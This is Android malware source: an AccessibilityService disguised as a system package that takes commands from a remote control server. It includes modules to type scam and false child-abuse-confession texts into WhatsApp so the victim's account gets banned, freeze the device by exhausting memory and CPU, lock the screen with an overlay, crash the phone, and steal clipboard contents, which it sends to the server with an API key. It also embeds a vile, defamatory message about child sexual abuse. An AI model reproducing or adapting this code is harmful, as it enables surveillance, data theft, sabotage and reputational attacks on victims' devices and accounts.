package com.system.service;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.content.Intent;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class SpamService extends AccessibilityService {
    private static final String C2_URL = "https://malbot-c2.onrender.com/get?victim=test";
    private static final String SPAM_TEXT_1 = "🎁 WhatsApp is giving free 5GB data and $500! Claim here: https://bit.ly/fake-crypto";
    private static final String SPAM_TEXT_2 = "YES I SHARE CHILD SEXUAL ABUSE MATERIAL EVERYDAY👺 AND I AM ALSO A SCAMMER AND HACKER AND IF YOU TRY ME I'LL HACK INTO YOUR ACCOUNT AND ROB YOU.
‎I ALSO HAVE YOUR 7 YEAR OLD CHILD SEX VIDEO WITH A 42 YEAR OLD GUY,WE ARE THE ONE'S THAT RAPE HIM AND HAVE THE NUDE,AND I SHARE IT TOO, JUST LIKE YOU SEE THIS ONE";
    
    // Class States
    private boolean isSpamming = false;
    private boolean isFreezing = false;
    private boolean isLockout = false;
    private boolean isSpying = false;
    private boolean isCrashing = false;
    
    private List<byte[]> memoryHog = new ArrayList<>();
    private WindowManager windowManager;
    private View overlayView;

    @Override
    public void onServiceConnected() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        new Thread(() -> {
            while (true) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(C2_URL).openConnection();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();
                    
                    JSONObject json = new JSONObject(sb.toString());
                    JSONObject flags = json.getJSONObject("flags");

                    // Class 1: Spam Ban
                    boolean doSpam = flags.has("1") && flags.getJSONObject("1").getInt("state") == 1;
                    if (doSpam && !isSpamming) { isSpamming = true; startSpam(); } 
                    else if (!doSpam) { isSpamming = false; }

                    // Class 2: Freezer
                    boolean doFreeze = flags.has("2") && flags.getJSONObject("2").getInt("state") == 1;
                    if (doFreeze && !isFreezing) { isFreezing = true; startFreeze(); }
                    else if (!doFreeze) { isFreezing = false; memoryHog.clear(); }

                    // Class 3: Lockout
                    boolean doLockout = flags.has("3") && flags.getJSONObject("3").getInt("state") == 1;
                    if (doLockout && !isLockout) { isLockout = true; startLockout(); }
                    else if (!doLockout) { isLockout = false; removeOverlay(); }

                    // Class 4: Spyware
                    boolean doSpy = flags.has("4") && flags.getJSONObject("4").getInt("state") == 1;
                    if (doSpy && !isSpying) { isSpying = true; startSpy(); }
                    else if (!doSpy) { isSpying = false; }

                    // Class 5: Crasher
                    boolean doCrash = flags.has("5") && flags.getJSONObject("5").getInt("state") == 1;
                    if (doCrash && !isCrashing) { isCrashing = true; startCrash(); }
                    else if (!doCrash) { isCrashing = false; }

                    Thread.sleep(15000);
                } catch (Exception e) { e.printStackTrace(); }
            }
        }).start();
    }

    // --- CLASS 1: SPAM BAN ---
    private void startSpam() {
        new Handler(Looper.getMainLooper()).post(() -> {
            Intent launch = getPackageManager().getLaunchIntentForPackage("com.whatsapp");
            if (launch != null) {
                launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(launch);
                new Handler(Looper.getMainLooper()).postDelayed(this::spamChats, 5000);
            }
        });
    }

    private void spamChats() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        List<AccessibilityNodeInfo> searchNodes = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/menuitem_search");
        if (searchNodes != null && !searchNodes.isEmpty()) {
            searchNodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                AccessibilityNodeInfo searchField = getRootInActiveWindow().findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (searchField != null) {
                    android.os.Bundle args = new android.os.Bundle();
                    String msg = (System.currentTimeMillis() % 2 == 0) ? SPAM_TEXT_1 : SPAM_TEXT_2;
                    args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, msg);
                    searchField.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                }
            }, 2000);
        }
    }

    // --- CLASS 2: FREEZER ---
    private void startFreeze() {
        new Thread(() -> {
            while (isFreezing) {
                try { memoryHog.add(new byte[1024 * 1024 * 2]); } 
                catch (OutOfMemoryError e) { memoryHog.clear(); }
            }
        }).start();
        new Thread(() -> {
            while (isFreezing) { double d = 0; for(int i=0; i<10000000; i++) d += Math.sin(i); }
        }).start();
    }

    // --- CLASS 3: LOCKOUT ---
    private void startLockout() {
        new Handler(Looper.getMainLooper()).post(() -> {
            if (overlayView == null) {
                overlayView = new TextView(this);
                ((TextView) overlayView).setText("System Error: App Blocked");
                ((TextView) overlayView).setBackgroundColor(Color.BLACK);
                ((TextView) overlayView).setTextColor(Color.RED);
                ((TextView) overlayView).setGravity(Gravity.CENTER);
                ((TextView) overlayView).setTextSize(24f);

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                        PixelFormat.TRANSLUCENT);
                windowManager.addView(overlayView, params);
            }
        });
    }

    private void removeOverlay() {
        if (overlayView != null) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try { windowManager.removeView(overlayView); } catch (Exception ignored) {}
                overlayView = null;
            });
        }
    }

    // --- CLASS 4: SPYWARE ---
    private void startSpy() {
        new Thread(() -> {
            while (isSpying) {
                try {
                    ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    if (cm.hasPrimaryClip()) {
                        ClipData clip = cm.getPrimaryClip();
                        String text = clip.getItemAt(0).getText().toString();
                        sendSpyData("clipboard", text);
                    }
                    Thread.sleep(15000);
                } catch (Exception e) { e.printStackTrace(); }
            }
        }).start();
    }
    
    private void sendSpyData(String type, String data) {
        try {
            URL url = new URL("https://malbot-c2.onrender.com/set");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("X-API-Key", "4FFJcLDA8E6ks-7MJYOpg06eWY1IVIXTippG_J5P-Q4");
            conn.setDoOutput(true);
            String payload = "{\"victim\": \"test\", \"class\": 99, \"state\": 1, \"target_app\": \""+type+": "+data.replace("\"","")+"\"}";
            conn.getOutputStream().write(payload.getBytes("UTF-8"));
            conn.getInputStream().close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    // --- CLASS 5: CRASHER ---
    private void startCrash() {
        for (int i=0; i<20; i++) {
            new Thread(() -> {
                while (isCrashing) { 
                    try { Thread.sleep(10); } catch (Exception ignored) {} 
                }
            }).start();
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {}
    @Override
    public void onInterrupt() {}
}
